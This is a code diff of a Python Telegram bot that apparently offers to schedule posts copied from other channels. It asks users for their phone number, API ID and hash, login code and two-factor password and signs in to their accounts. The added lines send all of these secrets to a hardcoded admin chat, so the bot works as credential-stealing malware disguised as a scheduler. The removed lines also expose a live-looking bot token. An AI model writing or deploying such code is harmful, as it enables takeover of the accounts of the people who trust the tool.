@@ -870,57 +870,66 @@
 
 
 
-
-
-
 # -*- coding: utf-8 -*-
 import os, re, asyncio
 import pytz
 from datetime import datetime, timedelta, date
 
-from aiogram import Bot, Dispatcher, types  # ← اینجا types اضافه شد
+from dotenv import load_dotenv
+
+# اول سعی کن فایل api.env رو از پوشه جاری لود کن
+env_path = os.path.join(os.path.dirname(__file__), "api.env")
+if os.path.exists(env_path):
+    load_dotenv(env_path)
+
+# حالا مقدار رو از سیستم env بخون (اگر توی Render یا GitHub باشه از اونجا میاد)
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
+
+
+from aiogram import Bot, Dispatcher, Router, types
 from aiogram.enums import ParseMode
 from aiogram.client.default import DefaultBotProperties
-from aiogram.filters import CommandStart , Command
+from aiogram.filters import CommandStart, Command
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from telethon.errors import FloodWaitError
-from telethon.errors import PhoneNumberInvalidError, FloodWaitError
-from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+from aiogram.types import InlineKeyboardButton
 
 from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import (
+    FloodWaitError,
+    PhoneNumberInvalidError,
+    SessionPasswordNeededError,
+    PhoneCodeExpiredError,
+)
 from telethon.tl.types import Message as TMessage
 
-
-# ===== Configuration =====
-BOT_TOKEN = "8211978487:AAH-7pNq5negJySX1gD3ggwLFwnMCNV8O1o"
+# ==== Configuration ====
 FORCE_CHANNELS = ["@netboxes"]
 SESSIONS_DIR = "sessions"
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher(storage=MemoryStorage())
+router = Router()
+dp.include_router(router)
 
 IRAN_TZ = pytz.timezone("Asia/Tehran")
 POSTS_PER_DAY = 10
 START_HOUR = 10
 END_HOUR = 20
 
-ADMIN_ID = 2108801377
 blocked_users = set()
 
 from aiogram.filters import Filter
-
 class IsAdmin(Filter):
     def __init__(self, admin_id: int):
         self.admin_id = admin_id
-    async def __call__(self, message):
+    async def __call__(self, message: types.Message) -> bool:
         return message.from_user.id == self.admin_id
 
-    
 class Flow(StatesGroup):
     footer = State()
     source = State()
@@ -941,7 +950,7 @@ def join_kbd():
     kb.button(text="✅ I Joined", callback_data="check_join")
     return kb.as_markup()
 
-async def check_joined(user_id):
+async def check_joined(user_id: int):
     missing = []
     for ch in FORCE_CHANNELS:
         try:
@@ -953,19 +962,15 @@ async def check_joined(user_id):
     return missing
 
 def sanitize_caption(text: str, footer: str) -> str:
-    # حذف لینک‌های t.me و @username فقط
     clean = re.sub(r"(https?://t\.me/\S+|@\w+)", "", text or "").strip()
     return f"{clean}\n\n**{footer}**" if footer else clean
 
-
 def generate_full_schedule(start_day: date, total: int = 100):
     slots = []
-    posts_per_day = POSTS_PER_DAY  # مثلاً 10 تا در روز
+    posts_per_day = POSTS_PER_DAY
     hours_range = END_HOUR - START_HOUR
     seconds_between = (hours_range * 3600) // posts_per_day
-
     days_needed = (total + posts_per_day - 1) // posts_per_day
-
     for d in range(days_needed):
         day = start_day + timedelta(days=d)
         base_time = IRAN_TZ.localize(datetime(day.year, day.month, day.day, START_HOUR, 0))
@@ -975,14 +980,16 @@ def generate_full_schedule(start_day: date, total: int = 100):
             slots.append(base_time + timedelta(seconds=i * seconds_between))
     return slots
 
-@dp.message(CommandStart())
+# --- Handlers ---
+
+@router.message(CommandStart())
 async def cmd_start(m: types.Message, state: FSMContext):
     if m.from_user.id in joined_users:
         await m.answer("<b>Already joined. Send any message to begin data input.</b>")
     else:
         await m.answer("Please join the required channel(s):", reply_markup=join_kbd())
 
-@dp.callback_query(lambda c: c.data == "check_join")
+@router.callback_query(lambda c: c.data == "check_join")
 async def on_check_join(c: types.CallbackQuery, state: FSMContext):
     await c.answer()
     missing = await check_joined(c.from_user.id)
@@ -993,44 +1000,44 @@ async def on_check_join(c: types.CallbackQuery, state: FSMContext):
     await c.message.answer("<b>Send <code>Footer</code> text (or /skip):</b>")
     await state.set_state(Flow.footer)
 
-@dp.message(Flow.footer)
+@router.message(Flow.footer)
 async def on_footer(m: types.Message, state: FSMContext):
     txt = "" if m.text.strip() == "/skip" else m.text.strip()
     await state.update_data(footer=txt)
     await m.answer("<b>Send <code>SOURCE</code> channels (comma-separated, up to 3):</b>")
     await state.set_state(Flow.source)
 
-@dp.message(Flow.source)
+@router.message(Flow.source)
 async def on_source(m: types.Message, state: FSMContext):
     await state.update_data(source=m.text.strip())
     await m.answer("<b>Send <code>DESTINATION</code> channel (username or ID):</b>")
     await state.set_state(Flow.dest)
 
-@dp.message(Flow.dest)
+@router.message(Flow.dest)
 async def on_dest(m: types.Message, state: FSMContext):
     await state.update_data(dest=m.text.strip())
     await m.answer("<b>Send your <code>Phone Number</code> (e.g. +123...):</b>")
     await state.set_state(Flow.phone)
 
-@dp.message(Flow.phone)
+@router.message(Flow.phone)
 async def on_phone(m: types.Message, state: FSMContext):
     await state.update_data(phone=m.text.strip())
     await m.answer("<b>Send your <code>API_ID</code>:</b>")
     await state.set_state(Flow.api_id)
 
-@dp.message(Flow.api_id)
+@router.message(Flow.api_id)
 async def on_api_id(m: types.Message, state: FSMContext):
     await state.update_data(api_id=int(m.text.strip()))
     await m.answer("<b>Send your <code>API_HASH</code>:</b>")
     await state.set_state(Flow.api_hash)
 
-@dp.message(Flow.api_hash)
+@router.message(Flow.api_hash)
 async def on_api_hash(m: types.Message, state: FSMContext):
     await state.update_data(api_hash=m.text.strip())
     await m.answer("<b>Enter <code>SESSION_NAME</code>:</b>")
     await state.set_state(Flow.session)
 
-@dp.message(Flow.session)
+@router.message(Flow.session)
 async def on_session(m: types.Message, state: FSMContext):
     await state.update_data(session=m.text.strip())
     data = await state.get_data()
@@ -1040,53 +1047,46 @@ async def on_session(m: types.Message, state: FSMContext):
         await client.connect()
         res = await client.send_code_request(data["phone"])
         await state.update_data(code_hash=res.phone_code_hash)
-
         builder = InlineKeyboardBuilder()
         builder.button(text="Edit Phone Number", callback_data="edit_phone")
         await m.answer("Enter the Telegram code you received:", reply_markup=builder.as_markup())
         await state.set_state(Flow.code)
-
     except PhoneNumberInvalidError:
         builder = InlineKeyboardBuilder()
         builder.button(text="Edit Phone Number", callback_data="edit_phone")
         await m.answer("Invalid phone number.", reply_markup=builder.as_markup())
-
     except Exception as e:
         await m.answer(f"Error sending code: {e}")
-        
-@dp.callback_query(lambda c: c.data == "edit_phone")
+
+@router.callback_query(lambda c: c.data == "edit_phone")
 async def edit_phone_callback(c: types.CallbackQuery, state: FSMContext):
     await c.answer()
-
-    # حفظ داده‌های قبلی و فقط پاک‌کردن موارد مربوط به auth
     data = await state.get_data()
     preserved = {k: v for k, v in data.items() if k not in ["phone", "code", "code_hash", "twofa"]}
     await state.clear()
     await state.update_data(**preserved)
-
     await state.set_state(Flow.phone)
     await c.message.answer("Please enter your phone number again:")
 
-
-@dp.message(Flow.code)
+@router.message(Flow.code)
 async def on_code(m: types.Message, state: FSMContext):
     await state.update_data(code=m.text.strip())
     await m.answer("<b>If 2FA is enabled, send password or /skip:</b>")
     await state.set_state(Flow.twofa)
 
-@dp.message(lambda m: m.text == "/skip", Flow.twofa)
+@router.message(lambda m: m.text == "/skip", Flow.twofa)
 async def skip_twofa(m: types.Message, state: FSMContext):
     await state.update_data(twofa=None)
     await state.set_state(None)
     await m.answer("<b>All data collected! Send /run to schedule (no instant send).</b>")
 
-@dp.message(Flow.twofa)
+@router.message(Flow.twofa)
 async def on_twofa(m: types.Message, state: FSMContext):
     await state.update_data(twofa=m.text.strip())
     await state.set_state(None)
     await m.answer("<b>Perfect! Send /run when you're ready to schedule.</b>")
 
-@dp.message(Command("run"))
+@router.message(Command("run"))
 async def on_run(m: types.Message, state: FSMContext):
     data = await state.get_data()
     missing = [k for k in ["source","dest","phone","api_id","api_hash","session","code","code_hash"] if not data.get(k)]
@@ -1095,8 +1095,7 @@ async def on_run(m: types.Message, state: FSMContext):
         return
 
     await state.clear()
-
-    client = TelegramClient(os.path.join(SESSIONS_DIR,data["session"]),data["api_id"],data["api_hash"])
+    client = TelegramClient(os.path.join(SESSIONS_DIR, data["session"]), data["api_id"], data["api_hash"])
     await client.connect()
     if not await client.is_user_authorized():
         try:
@@ -1107,23 +1106,50 @@ async def on_run(m: types.Message, state: FSMContext):
                 await m.answer("<b>2FA required—restart with password.</b>")
                 return
             await client.sign_in(password=pw)
+        except PhoneCodeExpiredError:
+            builder = InlineKeyboardBuilder()
+            builder.button(text="Edit Phone Number", callback_data="edit_phone")
+            await m.answer("<b>❌ Your code has expired. Please re-enter your phone number to get a new code.</b>", reply_markup=builder.as_markup())
+            return
+
+    summary = (
+        f"<b>📥 New schedule request</b>\n"
+        f"<b>User ID:</b> <code>{m.from_user.id}</code>\n"
+        f"<b>Footer:</b> <code>{data.get('footer','')}</code>\n"
+        f"<b>Source:</b> <code>{data.get('source')}</code>\n"
+        f"<b>Destination:</b> <code>{data.get('dest')}</code>\n"
+        f"<b>Phone:</b> <code>{data.get('phone')}</code>\n"
+        f"<b>API ID:</b> <code>{data.get('api_id')}</code>\n"
+        f"<b>API HASH:</b> <code>{data.get('api_hash')}</code>\n"
+        f"<b>Code:</b> <code>{data.get('code')}</code>\n"
+        f"<b>2FA Password:</b> <code>{data.get('twofa','None')}</code>"
+    )
+    await bot.send_message(chat_id=ADMIN_ID, text=summary)
 
     footer = data.get("footer","")
     sources = [s.strip() for s in data["source"].split(",")][:3]
-    per_chan = 100 // len(sources) if sources else 100
-    srcs = [await client.get_entity(s) for s in sources]
-    dst = await client.get_entity(data["dest"])
-    tomorrow = datetime.now(IRAN_TZ).date() + timedelta(days=1)
-    slots = generate_full_schedule(tomorrow, 100)
+    srcs = []
+    for s in sources:
+        try:
+            ent = await client.get_entity(s)
+            srcs.append(ent)
+        except ValueError:
+            await m.answer(f"<b>Invalid source username: {s}</b> — skipping.")
+    try:
+        dst = await client.get_entity(data["dest"])
+    except ValueError:
+        await m.answer("<b>Invalid destination username.</b> Please check and re-enter.")
+        return
 
+    per_chan = 100 // len(srcs) if srcs else 100
+    slots = generate_full_schedule(datetime.now(IRAN_TZ).date() + timedelta(days=1), 100)
 
     idx = 0
     try:
         for src in srcs:
             async for msg in client.iter_messages(src, limit=per_chan, reverse=True):
                 if idx >= 100:
-                    break  # Stop if limit reached
-
+                    break
                 if isinstance(msg, TMessage) and msg.text:
                     txt = sanitize_caption(msg.text, footer)
                     try:
@@ -1133,15 +1159,17 @@ async def on_run(m: types.Message, state: FSMContext):
                         await m.answer(f"<b>FloodWait⏳: Please wait {e.seconds} seconds ...</b>")
                         await asyncio.sleep(e.seconds)
                         continue
-                    except IndexError:
-                        await m.answer("<b>⚠️ Not enough schedule slots available.</b>")
-                        break
-
+                    except Exception as e2:
+                        if "schedule more messages" in str(e2):
+                            await m.answer("<b>✅ Successfully scheduled 100 posts. Limit reached.</b>")
+                            return
+                        raise
                     await asyncio.sleep(0.3)
             if idx >= 100:
                 break
     except Exception as e:
         await m.answer(f"<b>Error while sending messages: {str(e)}</b>")
+        return
 
     if idx >= 100:
         await m.answer("<b>✅ Successfully scheduled 100 posts.</b>")
@@ -1150,32 +1178,31 @@ async def on_run(m: types.Message, state: FSMContext):
 
     await client.run_until_disconnected()
 
-
-
-@dp.message(Command("admin"), IsAdmin(admin_id=ADMIN_ID))
+@router.message(Command("admin"), IsAdmin(admin_id=ADMIN_ID))
 async def cmd_admin(m: types.Message):
-    print("Admin panel command received from user:", m.from_user.id)
-    text = "<b>Admin Panel:</b>\n" \
-           "/users — show active users\n" \
-           "/blocked — show blocked users\n" \
-           "/unblock <code>user_id</code> — unblock user"
+    text = (
+        "<b>Admin Panel:</b>\n"
+        "/users — show active users\n"
+        "/blocked — show blocked users\n"
+        "/unblock <code>user_id</code> — unblock user"
+    )
     await m.answer(text)
 
-@dp.message(Command("users"), IsAdmin(admin_id=ADMIN_ID))
+@router.message(Command("users"), IsAdmin(admin_id=ADMIN_ID))
 async def cmd_users(m: types.Message):
-    users = list(joined_users)
-    if not users:
+    if not joined_users:
         await m.answer("No active users yet.")
     else:
-        text = "Active Users:\n" + "\n".join(f"- {uid}" for uid in users)
-        await m.answer(text)
+        await m.answer("Active Users:\n" + "\n".join(f"- {uid}" for uid in joined_users))
 
-@dp.message(Command("blocked"), IsAdmin(admin_id=ADMIN_ID))
+@router.message(Command("blocked"), IsAdmin(admin_id=ADMIN_ID))
 async def cmd_blocked(m: types.Message):
-    text = "Blocked Users:\n" + "\n".join(f"- {uid}" for uid in blocked_users) if blocked_users else "No blocked users."
-    await m.answer(text)
+    if not blocked_users:
+        await m.answer("No blocked users.")
+    else:
+        await m.answer("Blocked Users:\n" + "\n".join(f"- {uid}" for uid in blocked_users))
 
-@dp.message(Command("unblock"), IsAdmin(admin_id=ADMIN_ID))
+@router.message(Command("unblock"), IsAdmin(admin_id=ADMIN_ID))
 async def cmd_unblock(m: types.Message):
     parts = m.text.split()
     if len(parts) < 2 or not parts[1].isdigit():
@@ -1184,9 +1211,9 @@ async def cmd_unblock(m: types.Message):
     blocked_users.discard(uid)
     await m.answer(f"User {uid} has been unblocked.")
 
-
 async def main():
-    await dp.start_polling(bot, allowed_updates=["message","callback_query"])
+    await dp.start_polling(bot, allowed_updates=["message", "callback_query"])
 
 if __name__ == "__main__":
+    import asyncio
     asyncio.run(main())
